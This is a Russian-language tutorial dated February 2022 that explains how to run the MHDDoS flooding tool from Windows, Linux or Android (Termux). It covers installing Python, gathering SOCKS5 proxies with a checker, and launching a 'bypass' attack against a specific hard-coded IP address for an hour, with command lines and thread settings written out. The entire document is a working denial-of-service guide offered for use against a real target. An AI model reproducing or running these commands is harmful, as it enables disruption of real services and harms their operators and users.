<h1 align="center">ддос на пк 2</h1>
February 24, 2022

Это ддос с помощью питона. Можно использовать с любой ос(и андроид также, если есть термукс)

Скачиваем питон 3 https://www.python.org/downloads/


Ддосер: https://github.com/MHProDev/MHDDoS 

Чекер прокси: https://github.com/monosans/proxyscrape-checker

![https://github.com/BionecX/mhddos_p_docs/blob/main/images/ddos-na-pk-2-02-24.md_1.png](https://github.com/BionecX/mhddos_p_docs/blob/main/images/ddos-na-pk-2-02-24.md_1.png)

С гита качаем так: нажимаем на кнопку `Code`, и `Download ZIP`

Устанавливаем питон, распаковываем оба архива.
## Для виндовс:

  Добавляем в path путь к питону и пип https://okdk.ru/kak-dobavit-python-v-peremennuju-windows-path/

  Заходим в папку с чекером, нажимаем пкм+shift в пустом месте и нажимаем "Открыть в командной строке" или в PowerShell, если у вас будет такой пункт. 

  Вписываем: 

  `python -m pip install -r requirements.txt`

  Затем:

  `python main.py`

  После окончания проверки прокси заходим и папку proxies и копируем/перемещаем файл socks5.txt в папку с ддосером

  Открываем командную строку или повер шел так же как и в папке с чекером

  и вписываем:

  `python -m pip install -r requirements.txt`

  Теперь :

  `python start.py bypass 172.67.185.206 5 количество_потоков socks5.txt 63 время`

  ___Количество потоков___ зависит от инета и мощности проецсора. Пробуйте от 5 до того количества, которое можете потянуть.

  ___Время___ – это время (в секундах) в течение которого будет атака. Обычно ставим 3600 вместо этого слова.

  Например:

  `python start.py bypass 172.67.185.206  5 5 socks5.txt 63 3600`
<br/>
<br/>
<br/>
## Для линукс\андроид(termux):

  В линуксе(в термуксе без sudo): 

  `sudo apt install python3 python3-pip`

  В папке с чекером, и в папке с ддосером:

  `pip3 install -r requirements.txt`

  В папке с чекером:

  `python3 main.py`

  И копируем/перемещаем из папки `proxies` файл `socks5.txt` в папку с ддосером.

  В папке с ддосером:

  `python3 start.py bypass 172.67.185.206 5 количество_потоков socks5.txt 63 длина`

  ___Количество потоков___ зависит от инета и мощности проецсора. Пробуйте от 5 до того количества, которое можете потянуть.

  ___Длина___ (я сам хз за что отвечает поэтому ставлю 1000 обычно)























